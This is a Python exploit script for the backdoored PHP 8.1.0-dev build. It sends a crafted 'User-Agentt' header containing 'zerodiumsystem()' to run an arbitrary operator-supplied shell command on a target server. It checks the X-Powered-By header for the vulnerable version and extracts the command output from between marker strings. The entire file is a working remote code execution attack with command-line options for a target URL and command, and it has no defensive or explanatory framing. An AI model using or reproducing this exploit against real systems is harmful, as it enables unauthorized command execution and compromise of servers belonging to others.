import requests, argparse, sys 

def main(url:str, cmd:str):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "User-Agentt": "zerodiumsystem('echo \"0xP4UL-start\";"+cmd+";echo \"0xP4UL-end\"');"}
    try:
        serve = requests.get(url, headers=headers, timeout=10)
        vCheck(serve.headers['X-Powered-By'])
    except requests.exceptions.RequestException:
        sys.exit('Failed to serve request')
    if serve.ok:
        output_start = serve.text.split('0xP4UL-start')
        output_end = output_start[1].split("0xP4UL-end")
        print("Status code: "+str(serve.status_code)+"\nOutput: \n"+output_end[0])

def vCheck(version:str):
    v = "PHP/8.1.0-dev"
    if version != v:
        sys.exit(f"Error couldn't identify that the server is running {v}, the requested server seems to be running {version}")
    else:
        print(f"Server is running the vulnerable version: {v}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-url", help="t", required=True)
    parser.add_argument("-cmd", help="t", required=True)
    args = parser.parse_args()
    main(args.url, args.cmd)